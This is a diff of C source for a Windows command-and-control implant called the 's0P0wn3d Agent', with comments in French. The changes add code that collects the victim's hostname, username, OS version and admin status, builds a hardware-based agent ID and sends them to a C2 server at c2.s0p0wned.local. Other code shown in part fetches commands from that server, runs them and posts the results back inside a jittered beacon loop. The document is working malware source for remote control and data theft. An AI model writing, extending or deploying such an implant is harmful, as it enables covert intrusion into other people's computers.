@@ -2,11 +2,160 @@
 #include <wininet.h>
 #include <stdio.h>
 #include <time.h>
+#include <shlobj.h>
+#include <lmcons.h>
 
 // Configuration
 #define C2_SERVER "c2.s0p0wned.local"
 #define C2_PORT 8443
 #define BEACON_INTERVAL 10  // Secondes entre chaque beacon
+
+// Structure pour les infos système
+typedef struct {
+    char hostname[256];
+    char username[256];
+    char os_version[256];
+    char agent_id[64];
+    BOOL is_admin;
+    char computer_name[256];
+} SystemInfo;
+
+/**
+ * Génère un ID unique basé sur le hardware
+ */
+void generate_agent_id(char *output, size_t size, const char *hostname) {
+    // Récupérer le serial number du volume C:
+    DWORD volume_serial = 0;
+    GetVolumeInformationA("C:\\", NULL, 0, &volume_serial, NULL, NULL, NULL, 0);
+    
+    // Hash simple basé sur hostname + volume serial
+    unsigned int hash = 0x811c9dc5; // FNV offset basis
+    
+    // Hash du hostname
+    for (const char *p = hostname; *p; p++) {
+        hash ^= (unsigned char)*p;
+        hash *= 0x01000193; // FNV prime
+    }
+    
+    // XOR avec volume serial
+    hash ^= volume_serial;
+    
+    // Format: PREFIX_XXXXXXXX
+    snprintf(output, size, "WIN_%08X", hash);
+}
+
+/**
+ * Vérifie si le processus tourne avec les privilèges admin
+ */
+BOOL is_elevated() {
+    BOOL is_admin = FALSE;
+    PSID admin_group = NULL;
+    SID_IDENTIFIER_AUTHORITY nt_authority = SECURITY_NT_AUTHORITY;
+    
+    // Créer un SID pour le groupe Administrators
+    if (AllocateAndInitializeSid(
+        &nt_authority,
+        2,
+        SECURITY_BUILTIN_DOMAIN_RID,
+        DOMAIN_ALIAS_RID_ADMINS,
+        0, 0, 0, 0, 0, 0,
+        &admin_group))
+    {
+        // Vérifier si le token contient ce SID
+        if (!CheckTokenMembership(NULL, admin_group, &is_admin)) {
+            is_admin = FALSE;
+        }
+        FreeSid(admin_group);
+    }
+    
+    return is_admin;
+}
+
+/**
+ * Récupère la version de Windows
+ */
+void get_windows_version(char *output, size_t size) {
+    // Utiliser RtlGetVersion pour contourner GetVersionEx deprecated
+    typedef NTSTATUS (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
+    
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) {
+        strcpy(output, "Windows");
+        return;
+    }
+    
+    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
+    if (!RtlGetVersion) {
+        strcpy(output, "Windows");
+        return;
+    }
+    
+    RTL_OSVERSIONINFOW version_info = {0};
+    version_info.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
+    
+    if (RtlGetVersion(&version_info) == 0) {
+        // Identifier la version
+        if (version_info.dwMajorVersion == 10) {
+            if (version_info.dwBuildNumber >= 22000) {
+                snprintf(output, size, "Windows 11 (Build %lu)", version_info.dwBuildNumber);
+            } else {
+                snprintf(output, size, "Windows 10 (Build %lu)", version_info.dwBuildNumber);
+            }
+        } else if (version_info.dwMajorVersion == 6) {
+            if (version_info.dwMinorVersion == 3) {
+                strcpy(output, "Windows 8.1");
+            } else if (version_info.dwMinorVersion == 2) {
+                strcpy(output, "Windows 8");
+            } else if (version_info.dwMinorVersion == 1) {
+                strcpy(output, "Windows 7");
+            }
+        } else {
+            snprintf(output, size, "Windows %lu.%lu", 
+                    version_info.dwMajorVersion, 
+                    version_info.dwMinorVersion);
+        }
+    } else {
+        strcpy(output, "Windows");
+    }
+}
+
+/**
+ * Collecte toutes les informations système
+ */
+void collect_system_info(SystemInfo *info) {
+    DWORD size;
+    
+    // Hostname
+    size = sizeof(info->hostname);
+    if (!GetComputerNameA(info->hostname, &size)) {
+        strcpy(info->hostname, "UNKNOWN");
+    }
+    
+    // Username
+    size = sizeof(info->username);
+    if (!GetUserNameA(info->username, &size)) {
+        strcpy(info->username, "UNKNOWN");
+    }
+    
+    // Version Windows
+    get_windows_version(info->os_version, sizeof(info->os_version));
+    
+    // Privilèges admin
+    info->is_admin = is_elevated();
+    
+    // Agent ID unique
+    generate_agent_id(info->agent_id, sizeof(info->agent_id), info->hostname);
+    
+    // Computer name (peut différer de hostname)
+    strcpy(info->computer_name, info->hostname);
+    
+    printf("[*] System Info Collected:\n");
+    printf("    Agent ID:  %s\n", info->agent_id);
+    printf("    Hostname:  %s\n", info->hostname);
+    printf("    Username:  %s\n", info->username);
+    printf("    OS:        %s\n", info->os_version);
+    printf("    Admin:     %s\n", info->is_admin ? "Yes" : "No");
+}
 
 /**
  * Extrait la commande du JSON retourné par le serveur
@@ -113,7 +262,7 @@ void execute_command(const char *cmd, char *output, size_t output_size) {
 /**
  * Envoie le résultat d'une commande au serveur C2
  */
-int send_result(const char *agent_id, const char *command, const char *output) {
+int send_result(const SystemInfo *sys_info, const char *command, const char *output) {
     HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
     int success = 0;
     
@@ -131,7 +280,7 @@ int send_result(const char *agent_id, const char *command, const char *output) {
     
     // Début du JSON
     json_pos += snprintf(json_data + json_pos, sizeof(json_data) - json_pos,
-                        "{\"agent_id\":\"%s\",\"command\":\"", agent_id);
+                        "{\"agent_id\":\"%s\",\"command\":\"", sys_info->agent_id);
     
     // Échapper la commande
     for (const char *p = command; *p && json_pos < sizeof(json_data) - 10; p++) {
@@ -202,15 +351,11 @@ cleanup:
  * Sleep avec jitter aléatoire
  */
 void sleep_with_jitter(int base_seconds) {
-    // Générer un jitter entre -30% et +30%
     srand(time(NULL) + GetTickCount());
     
     double jitter_factor = 0.7 + ((double)rand() / RAND_MAX) * 0.6;
-    // jitter_factor sera entre 0.7 et 1.3
-    
     int sleep_ms = (int)(base_seconds * 1000 * jitter_factor);
     
-    // Minimum 1 seconde
     if (sleep_ms < 1000) sleep_ms = 1000;
     
     printf("[*] Sleeping %d seconds (base: %d)\n", sleep_ms / 1000, base_seconds);
@@ -220,7 +365,7 @@ void sleep_with_jitter(int base_seconds) {
 /**
  * Envoie un beacon et traite les commandes reçues
  */
-int do_beacon_cycle() {
+int do_beacon_cycle(SystemInfo *sys_info) {
     HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
     char response[4096];
     DWORD bytes_read = 0;
@@ -249,8 +394,16 @@ int do_beacon_cycle() {
         goto cleanup;
     }
     
-    // 2. Envoyer le beacon
-    char json_data[] = "{\"agent_id\":\"TEST_C\",\"hostname\":\"MY-PC\",\"username\":\"User\",\"os\":\"Windows 10\"}";
+    // 2. Construire le beacon JSON avec les vraies infos
+    char json_data[2048];
+    snprintf(json_data, sizeof(json_data),
+            "{\"agent_id\":\"%s\",\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"%s\",\"is_admin\":%s}",
+            sys_info->agent_id,
+            sys_info->hostname,
+            sys_info->username,
+            sys_info->os_version,
+            sys_info->is_admin ? "true" : "false");
+    
     char headers[] = "Content-Type: application/json\r\n";
     
     if (!HttpSendRequestA(hRequest, headers, strlen(headers), json_data, strlen(json_data))) {
@@ -280,7 +433,7 @@ int do_beacon_cycle() {
         printf("[+] Output: %.100s%s\n", result, strlen(result) > 100 ? "..." : "");
         
         // Envoyer le résultat
-        send_result("TEST_C", command, result);
+        send_result(sys_info, command, result);
     } else {
         printf("[-] No commands\n");
     }
@@ -299,26 +452,30 @@ cleanup:
  * Main avec boucle infinie
  */
 int main() {
+    SystemInfo sys_info = {0};
+    
     printf("======================================\n");
-    printf("  s0P0wn3d Agent - MVP Final\n");
+    printf("  s0P0wn3d Agent - Dynamic Info\n");
     printf("======================================\n");
     printf("[*] C2 Server: %s:%d\n", C2_SERVER, C2_PORT);
-    printf("[*] Starting beacon loop...\n");
+    printf("======================================\n\n");
+    
+    // Collecter les infos système une seule fois au démarrage
+    collect_system_info(&sys_info);
+    
+    printf("\n[*] Starting beacon loop...\n");
     printf("======================================\n\n");
     
     int failure_count = 0;
     
     // Boucle infinie
     while (1) {
-        if (do_beacon_cycle()) {
-            // Succès : reset le compteur d'échecs
+        if (do_beacon_cycle(&sys_info)) {
             failure_count = 0;
         } else {
-            // Échec : incrémenter
             failure_count++;
             printf("[!] Beacon failed (%d consecutive failures)\n", failure_count);
             
-            // Si trop d'échecs, attendre plus longtemps
             if (failure_count >= 5) {
                 printf("[!] Too many failures, sleeping 60 seconds...\n");
                 Sleep(60000);
@@ -326,7 +483,6 @@ int main() {
             }
         }
         
-        // Sleep avec jitter
         sleep_with_jitter(BEACON_INTERVAL);
     }
     
